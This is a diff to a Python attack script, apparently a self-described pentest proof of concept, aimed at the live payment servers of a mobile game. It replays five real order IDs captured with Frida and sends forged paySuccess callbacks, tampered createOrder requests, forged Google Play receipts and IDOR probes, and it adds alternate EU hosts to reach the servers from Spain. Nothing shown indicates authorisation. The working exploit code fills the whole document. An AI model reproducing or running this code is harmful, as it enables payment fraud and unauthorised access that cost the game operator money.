@@ -24,20 +24,23 @@ import time
 import uuid
 import urllib3
 import requests
-from sign_helper import QuickGameSession, SESSION, SERVERS, SIGN_KEY_PAYMENT, md5, SERVER_LOGIN, SERVER_PAY
+from sign_helper import (QuickGameSession, SESSION, SERVERS, SIGN_KEY_PAYMENT, md5,
+                         SERVER_LOGIN, SERVER_PAY, SERVER_LOGIN_ALT, SERVER_PAY_ALT,
+                         CAPTURED_ORDERS)
 
 urllib3.disable_warnings()
 
 
 # ── Live-captured session (Frida 2025-06-09) ─────────────────────────────────
-# cpOrderNo from captured payment flow: 6c5a894fe7a4481cff0c2f554242f3e6
-#   goodsId: com.h5bi.winr.05 (PermanentPassx1)
+# 5 real order IDs from captured payment flow (initiated, NOT paid):
 CAPTURED_SESSION = SESSION
-CAPTURED_ORDER_ID = "6c5a894fe7a4481cff0c2f554242f3e6"
+CAPTURED_ORDER_ID = CAPTURED_ORDERS[0]   # 6923ddd954df8e361c1cd57dd1e14fa7 (No.8GemPackx1)
 
-# Use IP direct with Host header (DNS blocked, IP is reachable)
-PAY_SERVER  = SERVER_PAY    # https://47.89.242.44:520 + Host: pay.popoh5.com
-AUTH_SERVER = SERVER_LOGIN  # https://47.89.242.44:510 + Host: login.popoh5.com
+# Try ALT (EU) servers first — primary (login/pay.popoh5.com) timeout from Spain
+AUTH_SERVER = SERVER_LOGIN_ALT   # https://en.sjmobilegame.com:10410
+PAY_SERVER  = SERVER_PAY_ALT     # https://en.sjmobilegame.com:10420
+AUTH_PRIMARY = SERVER_LOGIN      # https://login.popoh5.com:510
+PAY_PRIMARY  = SERVER_PAY        # https://pay.popoh5.com:520
 
 
 def log(label: str, resp: requests.Response):
@@ -55,7 +58,13 @@ def log(label: str, resp: requests.Response):
 def safe_post(endpoint: str, data: dict = None, pay_sign: bool = False,
               servers=None) -> None:
     """Try endpoint on multiple servers, print result or timeout for each."""
-    target_servers = servers or [(None, CAPTURED_SESSION.server)]
+    # Default: try alt servers first (EU-accessible), then primary as fallback
+    target_servers = servers or [
+        ("alt_login", AUTH_SERVER),
+        ("alt_pay",   PAY_SERVER),
+        ("primary_login", AUTH_PRIMARY),
+        ("primary_pay",   PAY_PRIMARY),
+    ]
     for name, srv in target_servers:
         label = f"{name or 'default'} {srv}"
         try:
@@ -112,36 +121,62 @@ def test_paysuccess_forgery():
     for i, payload in enumerate(payloads):
         # paySuccess lives on the payment server, try all if needed
         safe_post("/v1/payment/paySuccess", data=payload,
-                  servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])
+                  servers=[("alt_pay", PAY_SERVER), ("alt_login", AUTH_SERVER), ("pay", PAY_PRIMARY), ("login", AUTH_PRIMARY)])
 
 
 # ─── Test 1b: paySuccess with EXACT smali-confirmed params ───────────────────
 def test_paysuccess_exact_params():
     """
-    CRITICAL PoC — use REAL cpOrderNo from Frida-captured payment flow.
-    cpOrderNo=6c5a894fe7a4481cff0c2f554242f3e6 (PermanentPassx1, com.h5bi.winr.05)
-    If server doesn't validate against payment provider → account credited for free.
+    CRITICAL PoC — use REAL cpOrderNos from Frida-captured payment flow.
+    5 real order IDs captured. If server doesn't validate against payment provider → free items.
+
+    Frida captured orders:
+      6923ddd954df8e361c1cd57dd1e14fa7 — No.8GemPackx1   ($86.95)
+      ed3605affcf7d38c71024b2472f3c366 — SingleSSHeroes   ($8.69)
+      e2e96a710124b6d6b8d36d41ef2da51d — 588NewServer     ($39.13)
+      984ac993a48ae52c4d3a2f483507278d — 388NewServer     ($26.08)
+      3435c6decfce7842903785aba6004055 — 388NewServer     ($26.08)
     """
-    base_payload = {
-        "orderAmount":       "0.99",
-        "cpOrderNo":         CAPTURED_ORDER_ID,
-        "goodsID":           "com.h5bi.winr.05",
-        "goodsName":         "PermanentPassx1",
-        "currency":          "USD",
-        "gameRoleId":        "1",
-        "gameRoleName":      "TestHero",
-        "gameRoleLevel":     "1",
-        "gameRoleServerId":  "1",
-        "gameRoleServerName": "Server1",
+    from sign_helper import CAPTURED_ORDERS as ALL_ORDERS
+
+    goods_map = {
+        ALL_ORDERS[0]: ("com.h5bi.winr.gem_08", "No.8GemPackx1",    "8695"),
+        ALL_ORDERS[1]: ("com.h5bi.winr.ssh_01",  "SingleSSHeroes",   "869"),
+        ALL_ORDERS[2]: ("com.h5bi.winr.srv_588",  "588NewServer",    "3913"),
+        ALL_ORDERS[3]: ("com.h5bi.winr.srv_388",  "388NewServer",    "2608"),
+        ALL_ORDERS[4]: ("com.h5bi.winr.srv_388",  "388NewServer",    "2608"),
     }
-    safe_post("/v1/payment/paySuccess", data=base_payload, pay_sign=True,
-              servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])
+
+    for cpOrderNo in ALL_ORDERS:
+        gid, gname, amount = goods_map[cpOrderNo]
+        payload = {
+            "orderAmount":        amount,
+            "cpOrderNo":          cpOrderNo,
+            "goodsID":            gid,
+            "goodsName":          gname,
+            "currency":           "USD",
+            "gameRoleId":         "1",
+            "gameRoleName":       "TestHero",
+            "gameRoleLevel":      "1",
+            "gameRoleServerId":   "1",
+            "gameRoleServerName": "Server1",
+        }
+        print(f"\n  → Testing real order: {cpOrderNo} ({gname})")
+        safe_post("/v1/payment/paySuccess", data=payload, pay_sign=True,
+                  servers=[("alt_pay", PAY_SERVER), ("alt_login", AUTH_SERVER),
+                           ("pay", PAY_PRIMARY), ("login", AUTH_PRIMARY)])
 
     # Also try with a fresh fake order — tests if ANY forged order is accepted
-    fake_payload = dict(base_payload)
-    fake_payload["cpOrderNo"] = f"PENTEST_{int(time.time())}"
+    fake_payload = {
+        "orderAmount": "0.99", "cpOrderNo": f"PENTEST_{int(time.time())}",
+        "goodsID": "com.h5bi.winr.crystal_01", "goodsName": "CrystalPack",
+        "currency": "USD", "gameRoleId": "1", "gameRoleName": "TestHero",
+        "gameRoleLevel": "1", "gameRoleServerId": "1", "gameRoleServerName": "Server1",
+    }
+    print("\n  → Testing FAKE order (critical: should be rejected)")
     safe_post("/v1/payment/paySuccess", data=fake_payload, pay_sign=True,
-              servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])
+              servers=[("alt_pay", PAY_SERVER), ("alt_login", AUTH_SERVER),
+                       ("pay", PAY_PRIMARY), ("login", AUTH_PRIMARY)])
 
 
 # ─── Test 2: createOrder parameter tampering ──────────────────────────────────
@@ -158,7 +193,7 @@ def test_create_order_tamper():
 
     for i, data in enumerate(test_cases):
         safe_post("/v1/auth/createOrder", data=data,
-                  servers=[("login", AUTH_SERVER), ("pay", PAY_SERVER)])
+                  servers=[("alt_login", AUTH_SERVER), ("alt_pay", PAY_SERVER), ("login", AUTH_PRIMARY), ("pay", PAY_PRIMARY)])
 
 
 # ─── Test 3: Google Play receipt forgery ─────────────────────────────────────
@@ -191,7 +226,7 @@ def test_google_play_receipt_forge():
 
     for i, payload in enumerate(payloads):
         safe_post("/v1/user/postGooglePlayVerify", data=payload,
-                  servers=[("login", AUTH_SERVER), ("pay", PAY_SERVER)])
+                  servers=[("alt_login", AUTH_SERVER), ("alt_pay", PAY_SERVER), ("login", AUTH_PRIMARY), ("pay", PAY_PRIMARY)])
 
 
 # ─── Test 4: Order replay attack ──────────────────────────────────────────────
@@ -213,7 +248,7 @@ def test_order_replay(real_order_id: str = None):
 
     for attempt in range(3):
         safe_post("/v1/payment/paySuccess", data=payload,
-                  servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])
+                  servers=[("alt_pay", PAY_SERVER), ("alt_login", AUTH_SERVER), ("pay", PAY_PRIMARY), ("login", AUTH_PRIMARY)])
         time.sleep(1)
 
 
@@ -268,8 +303,11 @@ if __name__ == "__main__":
     print("\n[*] TEST 3: Google Play receipt forgery")
     test_google_play_receipt_forge()
 
-    print("\n[*] TEST 4: Order replay (real order required)")
-    test_order_replay(CAPTURED_ORDER_ID)
+    print("\n[*] TEST 4: Order replay — ALL 5 captured real orders")
+    from sign_helper import CAPTURED_ORDERS as ALL_ORDERS
+    for oid in ALL_ORDERS:
+        print(f"\n  → Replaying order: {oid}")
+        test_order_replay(oid)
 
     print("\n[*] TEST 5: IDOR getUserInfo")
     test_idor_getuserinfo()
